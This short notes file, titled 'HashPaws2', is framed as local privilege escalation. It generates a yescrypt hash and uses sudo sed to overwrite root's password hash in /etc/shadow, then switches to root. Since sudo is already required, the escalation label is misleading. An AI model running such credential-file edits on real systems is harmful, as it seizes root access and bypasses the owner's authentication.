# HashPaws2
# Getting (root) by modifying /etc/shadow - Local Privilege Escalation 

mkpasswd -m yescrypt "password123" # Boring example, but I used that.

# Put this into /etc/shadow
sudo sed -i 's|^root:[^:]*|root:<string here>|' /etc/shadow # yescrypt creates a new string, even if same password, so paste your $y$ string

# Log in, use your string
su root

# New password help
sudo passwd root
